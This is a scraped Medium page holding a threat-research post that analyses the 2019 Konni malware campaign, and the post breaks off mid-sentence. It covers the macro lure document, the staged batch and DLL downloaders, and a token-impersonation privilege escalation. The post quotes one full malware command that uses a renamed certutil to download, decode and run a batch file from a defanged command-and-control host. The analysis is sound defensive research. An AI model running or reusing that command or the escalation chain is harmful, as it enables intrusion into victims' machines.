d","nnsw":"usd","q8qw":"usd","d9y6":"usd","fx7w":"cad","nwf2":"cad"}},"paypalClientId":"AXj1G4fotC2GE8KzWX9mSxCH1wmPE3nJglf4Z2ig_amnhvlMVX87otaq58niAg9iuLktVNF_1WCMnN7v","paypal":{"host":"https:\u002F\u002Fapi.paypal.com:443","clientMode":"production","serverMode":"live","webhookId":"4G466076A0294510S","monthlyPlan":{"planId":"P-9WR0658853113943TMU5FDQA","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlan":{"planId":"P-7N8963881P8875835MU5JOPQ","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oneYearGift":{"name":"Medium Membership (1 Year, Digital Gift Code)","description":"Unlimited access to the best and brightest stories on Medium. Gift codes can be redeemed at medium.com\u002Fredeem.","price":"50.00","currency":"USD","sku":"membership-gift-1-yr"},"oldMonthlyPlan":{"planId":"P-96U02458LM656772MJZUVH2Y","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlan":{"planId":"P-59P80963JF186412JJZU3SMI","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"monthlyPlanWithTrial":{"planId":"P-66C21969LR178604GJPVKUKY","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlanWithTrial":{"planId":"P-6XW32684EX226940VKCT2MFA","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oldMonthlyPlanNoSetupFee":{"planId":"P-4N046520HR188054PCJC7LJI","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlanNoSetupFee":{"planId":"P-7A4913502Y5181304CJEJMXQ","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"sdkUrl":"https:\u002F\u002Fwww.paypal.com\u002Fsdk\u002Fjs"},"stripePublishableKey":"pk_live_7FReX44VnNIInZwrIIx6ghjl","log":{"json":true,"level":"info"},"imageUploadMaxSizeMb":25,"staffPicks":{"title":"Staff Picks","catalogId":"c7bc6e1ee00f"}},"session":{"xsrf":""}}</script><script>window.__APOLLO_STATE__ = {"ROOT_QUERY":{"__typename":"Query","viewer":null,"collectionByDomainOrSlug({\"domainOrSlug\":\"d-hunter\"})":{"__ref":"Collection:403a7b3e8c94"},"postResult({\"id\":\"b45a0f321e9b\"})":{"__ref":"Post:b45a0f321e9b"}},"ImageMetadata:":{"__typename":"ImageMetadata","id":""},"Collection:403a7b3e8c94":{"__typename":"Collection","id":"403a7b3e8c94","favicon":{"__ref":"ImageMetadata:"},"customStyleSheet":null,"colorPalette":{"__typename":"ColorPalette","highlightSpectrum":{"__typename":"ColorSpectrum","backgroundColor":"#FFFFFFFF","colorPoints":[{"__typename":"ColorPoint","color":"#FFFFFFFF","point":0},{"__typename":"ColorPoint","color":"#FFE8F3E8","point":0.1},{"__typename":"ColorPoint","color":"#FFE8F3E8","point":0.2},{"__typename":"ColorPoint","color":"#FFD1E7D1","point":0.6},{"__typename":"ColorPoint","color":"#FFA3D0A2","point":1}]},"defaultBackgroundSpectrum":{"__typename":"ColorSpectrum","backgroundColor":"#FFFFFFFF","colorPoints":[{"__typename":"ColorPoint","color":"#FF1A8917","point":0},{"__typename":"ColorPoint","color":"#FF11800E","point":0.1},{"__typename":"ColorPoint","color":"#FF0F730C","point":0.2},{"__typename":"ColorPoint","color":"#FF095407","point":1}]},"tintBackgroundSpectrum":null},"googleAnalyticsId":null,"editors":[{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:36b231b019fe"}}],"name":"d-hunter","avatar":{"__ref":"ImageMetadata:1*v7qE3mVpxpXKKfAHIDIMMQ.png"},"domain":null,"slug":"d-hunter","description":"Threat Hunting & Threat Research for the people","subscriberCount":30,"latestPostsConnection({\"paging\":{\"limit\":1}})":{"__typename":"PostConnection","posts":[{"__typename":"Post","title":"A look into Konni 2019 Campaign","latestPublishedAt":1578473412163}]},"viewerEdge":{"__ref":"CollectionViewerEdge:collectionId:403a7b3e8c94-viewerId:lo_3fc4c66d8421"},"twitterUsername":"DoronKarmi","facebookPageId":null,"logo":{"__ref":"ImageMetadata:1*TdnwvJX4h5-6-4x8HU600w.png"}},"User:36b231b019fe":{"__typename":"User","id":"36b231b019fe","linkedAccounts":{"__ref":"LinkedAccounts:36b231b019fe"},"isSuspended":false,"imageId":"2*u3JNIYOcE-R_QOB3kyY5tA.png","mediumMemberAt":0,"verifications":{"__typename":"VerifiedInfo","isBookAuthor":false},"name":"Doron Karmi","socialStats":{"__typename":"SocialStats","followerCount":4},"username":"DoronKarmi","customDomainState":null,"hasSubdomain":false,"bio":"Threat Hunter • Threat Research • Malware Analysis","isPartnerProgramEnrolled":false,"viewerEdge":{"__ref":"UserViewerEdge:userId:36b231b019fe-viewerId:lo_3fc4c66d8421"},"viewerIsUser":false,"newsletterV3":null,"postSubscribeMembershipUpsellShownAt":0,"userPostCounts({\"includeResponsesCount\":true})":null,"membership":null,"allowNotes":true,"twitterScreenName":"DoronKarmi"},"ImageMetadata:1*v7qE3mVpxpXKKfAHIDIMMQ.png":{"__typename":"ImageMetadata","id":"1*v7qE3mVpxpXKKfAHIDIMMQ.png"},"LinkedAccounts:36b231b019fe":{"__typename":"LinkedAccounts","mastodon":null,"id":"36b231b019fe"},"UserViewerEdge:userId:36b231b019fe-viewerId:lo_3fc4c66d8421":{"__typename":"UserViewerEdge","id":"userId:36b231b019fe-viewerId:lo_3fc4c66d8421","isFollowing":false,"isUser":false,"isMuting":false},"Paragraph:4a39df3717a7_0":{"__typename":"Paragraph","id":"4a39df3717a7_0","name":"e1aa","type":"H3","href":null,"layout":null,"metadata":null,"text":"A Look Into Konni 2019 Campaign","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_1":{"__typename":"Paragraph","id":"4a39df3717a7_1","name":"b6e0","type":"P","href":null,"layout":null,"metadata":null,"text":"Konni is a remote administration tool, observed in the wild since early 2014. The Konni malware family is potentially linked to APT37, a North-Korean cyber espionage group active since 2012. The group primary victims are South-Korean political organizations, as well as Japan, Vietnam, Russia, Nepal, China, India, Romania, Kuwait, and other parts of the Middle East.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":128,"end":133,"href":"https:\u002F\u002Fattack.mitre.org\u002Fgroups\u002FG0067\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*SYABUcSUSvyPqWAAqe7hMw.png":{"__typename":"ImageMetadata","id":"1*SYABUcSUSvyPqWAAqe7hMw.png","originalHeight":918,"originalWidth":1823,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_2":{"__typename":"Paragraph","id":"4a39df3717a7_2","name":"0809","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*SYABUcSUSvyPqWAAqe7hMw.png"},"text":"Map chart of APT37 main targets","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_3":{"__typename":"Paragraph","id":"4a39df3717a7_3","name":"d73a","type":"P","href":null,"layout":null,"metadata":null,"text":"The latest activities leveraging the Konni malware family potentially target political organizations and politically motivated victims in Russia and South-Korea. During my research, I observed 3 distinct campaigns throughout 2019: starting from January to late September.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_4":{"__typename":"Paragraph","id":"4a39df3717a7_4","name":"4ef5","type":"P","href":null,"layout":null,"metadata":null,"text":"Konni Infection chain consists of multiple stages and utilizes living-off-the-land binaries in its operation from the use of certutil.exe to download additional files and decode their content to sc.exe and reg.exe for persistence.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_5":{"__typename":"Paragraph","id":"4a39df3717a7_5","name":"85c9","type":"P","href":null,"layout":null,"metadata":null,"text":"These campaigns leverage similar C2 infrastructure for the delivery and a specific free FTP service used for exfiltration the stolen data from the affected targets. Additionally, the macro-armed lure documents used to deliver and install the Konni payloads have similarities across all 3 campaigns.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_6":{"__typename":"Paragraph","id":"4a39df3717a7_6","name":"4b09","type":"P","href":null,"layout":null,"metadata":null,"text":"Konni is a modular malware that collects reconnaissance data on the target machine prior to sending further modules to the victim. We were unable to find additional operations related to the Konni malware family that might reveals further capabilities and malware types used by the group associated with Konni activity.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_7":{"__typename":"Paragraph","id":"4a39df3717a7_7","name":"72f5","type":"P","href":null,"layout":null,"metadata":null,"text":"During our analysis I found overlapping between the Konni infection chain, tools and technique used by the Syscon backdoor [1] using a service called COMSysApp to load the payload as a service DLL as a mean to achieve persistence on the victim machine. Although similarities have been observed between Konni and Syscon, at this time we can’t say with full certainty that the same threat actor is behind both operations.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":124,"end":125,"href":"https:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fsyscon-backdoor-uses-ftp-as-a-cc-channel\u002F","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":150,"end":159,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_8":{"__typename":"Paragraph","id":"4a39df3717a7_8","name":"e024","type":"H3","href":null,"layout":null,"metadata":null,"text":"Campaign Timeline","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*uYEMeYkNdunD5RrlC87JNQ.png":{"__typename":"ImageMetadata","id":"1*uYEMeYkNdunD5RrlC87JNQ.png","originalHeight":524,"originalWidth":1785,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_9":{"__typename":"Paragraph","id":"4a39df3717a7_9","name":"30d9","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*uYEMeYkNdunD5RrlC87JNQ.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_10":{"__typename":"Paragraph","id":"4a39df3717a7_10","name":"94a4","type":"H3","href":null,"layout":null,"metadata":null,"text":"Execution flow","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*CfSltI6XAjK-X9tb9J2FvQ.png":{"__typename":"ImageMetadata","id":"1*CfSltI6XAjK-X9tb9J2FvQ.png","originalHeight":974,"originalWidth":1760,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_11":{"__typename":"Paragraph","id":"4a39df3717a7_11","name":"fe0f","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*CfSltI6XAjK-X9tb9J2FvQ.png"},"text":"Typical Konni Execution Flow","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_12":{"__typename":"Paragraph","id":"4a39df3717a7_12","name":"3af6","type":"H3","href":null,"layout":null,"metadata":null,"text":"Konni Multi-Stage Operation","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_13":{"__typename":"Paragraph","id":"4a39df3717a7_13","name":"236f","type":"H4","href":null,"layout":null,"metadata":null,"text":"Stage 1 — Initial Execution","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_14":{"__typename":"Paragraph","id":"4a39df3717a7_14","name":"c366","type":"P","href":null,"layout":null,"metadata":null,"text":"In mid-July 2019 I encountered with an emerging campaign delivering the Konni malware.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_15":{"__typename":"Paragraph","id":"4a39df3717a7_15","name":"055e","type":"P","href":null,"layout":null,"metadata":null,"text":"The threat actor behind the campaign leveraged a malicious macro-armed Microsoft Word document titled: “О ситуации на Корейском полуострове и перспективах диалога между США и КНДР” (translated to: About the situation on the Korean Peninsula and the prospect of a dialogue between the United States and the DPRK). Unlike the previously observed campaign, the August campaign potentially targeting Russian language speakers with an interest in Korean Geo-political situation, the lure document used in this campaign is written Cyrillic and contains content related to North Korean American foreign affairs.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*dooiijoRyJZnCoOZodqB0w.png":{"__typename":"ImageMetadata","id":"1*dooiijoRyJZnCoOZodqB0w.png","originalHeight":834,"originalWidth":811,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_16":{"__typename":"Paragraph","id":"4a39df3717a7_16","name":"d687","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*dooiijoRyJZnCoOZodqB0w.png"},"text":"Decoy document for 4c201f9949804e90f94fe91882cb8aad3e7daf496a7f4e792b9c7fed95ab0726","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_17":{"__typename":"Paragraph","id":"4a39df3717a7_17","name":"d6b4","type":"P","href":null,"layout":null,"metadata":null,"text":"When analyzing the document, we see that the internal codepage of the lure document is 949 — ANSI\u002FOEM Korean (Unified Hangul Code). indicating that the actor who created the document used Korean keyboard layout. This is an indication that the author is a Korean native speaker.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*QHL0IR8bu5Nv29Nvmjpnrw.png":{"__typename":"ImageMetadata","id":"1*QHL0IR8bu5Nv29Nvmjpnrw.png","originalHeight":375,"originalWidth":472,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_18":{"__typename":"Paragraph","id":"4a39df3717a7_18","name":"2470","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*QHL0IR8bu5Nv29Nvmjpnrw.png"},"text":"Document Properties. Codepage 949 is windows Korean (Unified Hangul Code)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_19":{"__typename":"Paragraph","id":"4a39df3717a7_19","name":"b4b0","type":"P","href":null,"layout":null,"metadata":null,"text":"The lure document contains VBA macro code with the following capabilities:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_20":{"__typename":"Paragraph","id":"4a39df3717a7_20","name":"dfef","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Changes the font color from light grey to black — to trick the victim to enable content.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_21":{"__typename":"Paragraph","id":"4a39df3717a7_21","name":"1231","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Checks if windows is a 32 or 64 bit version.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_22":{"__typename":"Paragraph","id":"4a39df3717a7_22","name":"0da1","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Constructs and executes the command-line to download additional files","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*XP34DwKziy5i2Indeaj1ig.png":{"__typename":"ImageMetadata","id":"1*XP34DwKziy5i2Indeaj1ig.png","originalHeight":678,"originalWidth":1346,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_23":{"__typename":"Paragraph","id":"4a39df3717a7_23","name":"5070","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*XP34DwKziy5i2Indeaj1ig.png"},"text":"Macro code for 4c201f9949804e90f94fe91882cb8aad3e7daf496a7f4e792b9c7fed95ab0726","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_24":{"__typename":"Paragraph","id":"4a39df3717a7_24","name":"feb7","type":"P","href":null,"layout":null,"metadata":null,"text":"The document contains 3 hidden text boxes. Each text box has a hexadecimal string constructed to a command that is executed once the document is opened by the victim.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*jKI1-7t9R-7bFfPpH6CVeA.png":{"__typename":"ImageMetadata","id":"1*jKI1-7t9R-7bFfPpH6CVeA.png","originalHeight":284,"originalWidth":753,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_25":{"__typename":"Paragraph","id":"4a39df3717a7_25","name":"047e","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*jKI1-7t9R-7bFfPpH6CVeA.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_26":{"__typename":"Paragraph","id":"4a39df3717a7_26","name":"946d","type":"P","href":null,"layout":null,"metadata":null,"text":"Full Command Line example: c:\\windows\\system32\\cmd.exe \u002Fq \u002Fc copy \u002Fy %windir%\\system32\\certutil.exe %temp%\\mx.exe && cd \u002Fd %temp% && mx -urlcache -split -f http:\u002F\u002Fhandicap[.]eu5.org\u002F1.txt && mx -decode -f 1.txt 1.bat && del \u002Ff \u002Fq 1.txt && 1.bat","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":156,"end":187,"href":"http:\u002F\u002Fhandicap[.]eu5.org\u002F1.txt","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":27,"end":244,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_27":{"__typename":"Paragraph","id":"4a39df3717a7_27","name":"6eb2","type":"P","href":null,"layout":null,"metadata":null,"text":"Certutil is a living-off the land command line utility that can be used to obtain certificate authority information and configure certificate services. Threat actors usually utilize certutil to download remote files from a given URL. It also incorporates a built-in function to decode base64-encoded files.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":9,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_28":{"__typename":"Paragraph","id":"4a39df3717a7_28","name":"fb5e","type":"P","href":null,"layout":null,"metadata":null,"text":"CMD silently copies certutil.exe into temp directory and rename it to “mx.exe” in an attempt to evade detection and then downloads 1.txt from from a remote resource: http:\u002F\u002Fhandicap.eu5[.]org. The text file contains a base64 encoded string that is decoded by certutil and saved as 1.bat.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":166,"end":192,"href":"http:\u002F\u002Fhandicap.eu5[.]org.","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_29":{"__typename":"Paragraph","id":"4a39df3717a7_29","name":"b52c","type":"P","href":null,"layout":null,"metadata":null,"text":"The threat actor removes tracks by silently deleting 1.txt from the temp directory and then executes 1.bat.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*Opb3gqfa3GsgancSVE7cgg.png":{"__typename":"ImageMetadata","id":"1*Opb3gqfa3GsgancSVE7cgg.png","originalHeight":261,"originalWidth":982,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_30":{"__typename":"Paragraph","id":"4a39df3717a7_30","name":"7340","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*Opb3gqfa3GsgancSVE7cgg.png"},"text":"Konni Initial Execution","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_31":{"__typename":"Paragraph","id":"4a39df3717a7_31","name":"6f52","type":"H4","href":null,"layout":null,"metadata":null,"text":"Stage 2 — Privilege Escalation","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_32":{"__typename":"Paragraph","id":"4a39df3717a7_32","name":"7413","type":"P","href":null,"layout":null,"metadata":null,"text":"The batch script acts as a second stage downloader and downloads two additional files, depending on the system architecture. Certutil is executed to download a txt file and decode its content. Decoding each base64 string (32-bit or 64-bit version) results in a cabinet file — setup.cab","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*75ds5VQj6SP3IBF0DR9WBQ.png":{"__typename":"ImageMetadata","id":"1*75ds5VQj6SP3IBF0DR9WBQ.png","originalHeight":261,"originalWidth":693,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_33":{"__typename":"Paragraph","id":"4a39df3717a7_33","name":"ea2a","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*75ds5VQj6SP3IBF0DR9WBQ.png"},"text":"1.bat: downloads next stager","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_34":{"__typename":"Paragraph","id":"4a39df3717a7_34","name":"19b4","type":"P","href":null,"layout":null,"metadata":null,"text":"The content of the cabinet file is then extracted into %temp% folder, and setup.cab file is deleted from the system.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*BeuNJT0ProaoE_9AmRptHQ.png":{"__typename":"ImageMetadata","id":"1*BeuNJT0ProaoE_9AmRptHQ.png","originalHeight":98,"originalWidth":528,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_35":{"__typename":"Paragraph","id":"4a39df3717a7_35","name":"6366","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*BeuNJT0ProaoE_9AmRptHQ.png"},"text":"setup.cab files","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_36":{"__typename":"Paragraph","id":"4a39df3717a7_36","name":"66cc","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Install.bat — acts as installer to ensure persistence and execute mshlpsrvc.dll.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":11,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":66,"end":80,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_37":{"__typename":"Paragraph","id":"4a39df3717a7_37","name":"13bb","type":"ULI","href":null,"layout":null,"metadata":null,"text":"mshlpweb.dll — acts as loader; responsible to elevate privileges.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":12,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_38":{"__typename":"Paragraph","id":"4a39df3717a7_38","name":"4a69","type":"ULI","href":null,"layout":null,"metadata":null,"text":"mshlpsrvc.dll — final payload; responsible for data exfiltration.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":13,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_39":{"__typename":"Paragraph","id":"4a39df3717a7_39","name":"b9ca","type":"ULI","href":null,"layout":null,"metadata":null,"text":"mshlpsrvc.ini — configuration file; contains URL used by mshlpsrvc.dll","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":13,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":57,"end":70,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_40":{"__typename":"Paragraph","id":"4a39df3717a7_40","name":"1d61","type":"P","href":null,"layout":null,"metadata":null,"text":"Both dropped DLL files are unsigned and packed with UPX packer.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*LDOYGx2XLMrpluXskH5Q7g.png":{"__typename":"ImageMetadata","id":"1*LDOYGx2XLMrpluXskH5Q7g.png","originalHeight":293,"originalWidth":734,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_41":{"__typename":"Paragraph","id":"4a39df3717a7_41","name":"0651","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*LDOYGx2XLMrpluXskH5Q7g.png"},"text":"DLL file is unsigned & UPX strings indicate file is packed","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_42":{"__typename":"Paragraph","id":"4a39df3717a7_42","name":"1ed4","type":"P","href":null,"layout":null,"metadata":null,"text":"To check level of permissions, the threat actor uses net.exe. if the current user has high privileges, install.bat is executed directly. Otherwise, mshlpweb.dll is executed using rundll32.exe.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*__iSzf4khXyuoND6-jSW3w.png":{"__typename":"ImageMetadata","id":"1*__iSzf4khXyuoND6-jSW3w.png","originalHeight":306,"originalWidth":501,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_43":{"__typename":"Paragraph","id":"4a39df3717a7_43","name":"6f77","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*__iSzf4khXyuoND6-jSW3w.png"},"text":"1.bat: Checks for user’s permission","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_44":{"__typename":"Paragraph","id":"4a39df3717a7_44","name":"335c","type":"P","href":null,"layout":null,"metadata":null,"text":"mshlpweb.dll is a loader that uses a known token impersonation technique to elevate permissions and execute install.bat with high privileges. To gain higher privileges mshlpweb.dll execute the Windows Update Standalone Installer, wusa.exe. This process runs as a high-integrity process by default, since its set to auto-elevate within its manifest.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*2GjpFu43Q0BxoPiSa0Cy5A.png":{"__typename":"ImageMetadata","id":"1*2GjpFu43Q0BxoPiSa0Cy5A.png","originalHeight":476,"originalWidth":773,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_45":{"__typename":"Paragraph","id":"4a39df3717a7_45","name":"dfbf","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*2GjpFu43Q0BxoPiSa0Cy5A.png"},"text":"wusa.exe manifest, autoElevate set to true","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_46":{"__typename":"Paragraph","id":"4a39df3717a7_46","name":"529d","type":"P","href":null,"layout":null,"metadata":null,"text":"mshlpweb.dll contains an access token impersonation routine that duplicates the token of the high integrity instance of wusa.exe, and uses it to create a new cmd.exe process running under the security context of the impersonated user[2], which in turn execute the installer — 